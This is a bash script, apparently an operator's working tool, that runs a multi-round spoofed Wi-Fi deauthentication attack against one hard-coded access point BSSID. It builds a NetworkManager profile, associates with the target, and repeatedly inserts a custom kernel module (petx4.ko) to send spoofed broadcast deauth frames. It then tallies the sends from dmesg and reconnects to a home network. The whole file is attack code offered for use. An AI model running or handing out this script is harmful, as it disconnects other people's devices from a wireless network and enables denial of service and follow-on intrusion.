#!/bin/bash
# deauth_pe_multi2.sh - Multi-round spoofed deauth attack (fixed)
# Uses UUID for connection reference to avoid unicode issues
#
# Usage: sudo bash /tmp/deauth_pe_multi2.sh [rounds]

ROUNDS=${1:-5}
TARGET_BSSID="04:67:61:D6:DC:92"
TARGET_BSSID_LC="04:67:61:d6:dc:92"
HOME_SSID="9899a5b77"
CON_NAME="target_ap"

echo "[*] Spoofed deauth attack - $ROUNDS rounds"

cd /tmp
[ -f petx4.ko ] || { as -o petx4.o petx4.S && ld -r -o petx4.ko petx4.o; }

# Delete old profile, create with ascii name
nmcli connection delete "$CON_NAME" 2>/dev/null || true
nmcli connection add type wifi con-name "$CON_NAME" \
    ssid "$(printf '\xe4\xb8\x8d\xe6\x83\xb3\xe4\xb8\x8a\xe7\x8f\xad')" \
    wifi-sec.key-mgmt wpa-psk \
    wifi-sec.psk "dummypassword12345678" \
    802-11-wireless.bssid "$TARGET_BSSID" 2>/dev/null
echo "[*] Profile '$CON_NAME' created"

DEAUTH_COUNT=0

for round in $(seq 1 $ROUNDS); do
    echo ""
    echo "[*] === Round $round/$ROUNDS ==="

    nmcli connection down "$HOME_SSID" 2>/dev/null || true
    sleep 0.3

    # Connect using ascii name
    nmcli connection up "$CON_NAME" 2>/dev/null &
    PID=$!

    # Poll for connection (max 10s)
    OK=0
    for i in $(seq 1 100); do
        if dmesg | tail -3 | grep -q "connected to $TARGET_BSSID_LC"; then
            OK=1
            break
        fi
        sleep 0.1
    done

    if [ $OK -eq 0 ]; then
        echo "    Connection timeout, skipping"
        kill $PID 2>/dev/null
        wait $PID 2>/dev/null
        sleep 0.5
        # Try to reconnect home before next round
        nmcli connection up "$HOME_SSID" 2>/dev/null &
        wait $! 2>/dev/null
        sleep 1
        continue
    fi

    echo "    Connected to target! Loading petx4..."

    # Send spoofed deauth
    rmmod kfind 2>/dev/null || true
    insmod /tmp/petx4.ko 2>/dev/null
    if [ $? -eq 0 ]; then
        DEAUTH_COUNT=$((DEAUTH_COUNT + 1))
        echo "    DEAUTH #$DEAUTH_COUNT sent!"
        sleep 0.2
        rmmod kfind 2>/dev/null || true

        # Try second deauth
        insmod /tmp/petx4.ko 2>/dev/null
        if [ $? -eq 0 ]; then
            DEAUTH_COUNT=$((DEAUTH_COUNT + 1))
            echo "    DEAUTH #$DEAUTH_COUNT sent!"
            rmmod kfind 2>/dev/null || true
        fi
    fi

    # Wait for WPA timeout to disconnect naturally
    sleep 0.5
    kill $PID 2>/dev/null
    wait $PID 2>/dev/null

    # Brief pause between rounds
    sleep 1
done

echo ""
echo "[*] === RESULTS ==="
echo "[*] $DEAUTH_COUNT spoofed deauths sent in $ROUNDS rounds"
echo "[*] Spoofed deauth log:"
dmesg | grep "Deauth TX.*ff:ff:ff:ff:ff:ff.*from 04:67:61" | tail -20

# Cleanup
nmcli connection delete "$CON_NAME" 2>/dev/null || true
echo "[*] Reconnecting home..."
nmcli connection up "$HOME_SSID" 2>/dev/null || true
sleep 3
nmcli connection show --active | head -5
echo "[*] Done."
